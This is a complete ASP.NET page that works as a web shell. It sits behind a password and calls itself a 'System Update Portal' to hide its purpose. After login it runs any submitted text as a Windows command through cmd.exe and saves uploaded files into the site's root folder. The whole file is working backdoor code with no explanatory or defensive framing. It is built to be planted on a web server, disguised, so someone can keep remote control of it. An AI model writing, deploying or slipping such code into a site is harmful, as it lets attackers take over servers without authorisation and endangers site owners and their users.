<%@ Page Language="C#" Debug="false" Trace="false" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Text" %>
<script runat="server">
    // Configuration
    private string passwordHash = "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8";
    private string sessionKey = "AUTH_SESSION";
    
    private static string GetHash(string input) {
        using (var sha256 = SHA256.Create()) {
            return BitConverter.ToString(sha256.ComputeHash(Encoding.UTF8.GetBytes(input))).Replace("-", "").ToLower();
        }
    }
    
    void Page_Load(object sender, EventArgs e) {
        Response.Cache.SetCacheability(HttpCacheability.NoCache);
        
        // Handle logout
        if (Request.QueryString["logout"] != null) {
            Session[sessionKey] = null;
            Response.Redirect(Request.Url.AbsolutePath);
        }
        
        // Handle authentication
        if (Request.Form["auth"] != null && Request.Form["pwd"] != null) {
            string enteredPassword = Request.Form["pwd"];
            if (GetHash(enteredPassword) == passwordHash) {
                Session[sessionKey] = true;
                Response.Redirect(Request.Url.AbsolutePath);
            } else {
                Response.Write("<div style='color:red;'>Invalid password</div>");
            }
        }
        
        // Show appropriate interface
        if (IsAuthenticated()) {
            ShowShellInterface();
        } else {
            ShowLoginForm();
        }
    }
    
    bool IsAuthenticated() {
        return Session[sessionKey] != null && (bool)Session[sessionKey];
    }
    
    void ShowLoginForm() {
        string loginForm = @"
            <!DOCTYPE html>
            <html>
            <head><title>System Update</title></head>
            <body>
                <h3>System Update Portal</h3>
                <form method='post'>
                    <input type='password' name='pwd' placeholder='Enter update key' />
                    <input type='submit' value='Authenticate' />
                    <input type='hidden' name='auth' value='1' />
                </form>
            </body>
            </html>";
        Response.Write(loginForm);
    }
    
    void ShowShellInterface() {
        // Handle file upload
        if (Request.Files.Count > 0) {
            HttpPostedFile file = Request.Files[0];
            if (file != null && file.ContentLength > 0) {
                try {
                    string savePath = Server.MapPath("~/") + Path.GetFileName(file.FileName);
                    file.SaveAs(savePath);
                    Response.Write("<div style='color:green;'>File uploaded: " + file.FileName + "</div>");
                } catch (Exception ex) {
                    Response.Write("<div style='color:red;'>Upload failed: " + ex.Message + "</div>");
                }
            }
        }
        
        // Handle command execution
        if (Request.Form["cmd"] != null) {
            try {
                var process = new System.Diagnostics.Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c " + Request.Form["cmd"];
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.CreateNoWindow = true;
                process.Start();
                string output = process.StandardOutput.ReadToEnd() + process.StandardError.ReadToEnd();
                process.WaitForExit();
                Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
            } catch (Exception ex) {
                Response.Write("<div style='color:red;'>Error: " + ex.Message + "</div>");
            }
        }
        
        // Show interface
        string interfaceHtml = @"
            <h3>File Upload</h3>
            <form method='post' enctype='multipart/form-data'>
                <input type='file' name='file' />
                <input type='submit' value='Upload' />
            </form>
            
            <h3>Command Execution</h3>
            <form method='post'>
                <input type='text' name='cmd' placeholder='Enter command' />
                <input type='submit' value='Execute' />
            </form>
            
            <br/><a href='?logout=1'>Logout</a>";
        Response.Write(interfaceHtml);
    }
</script>
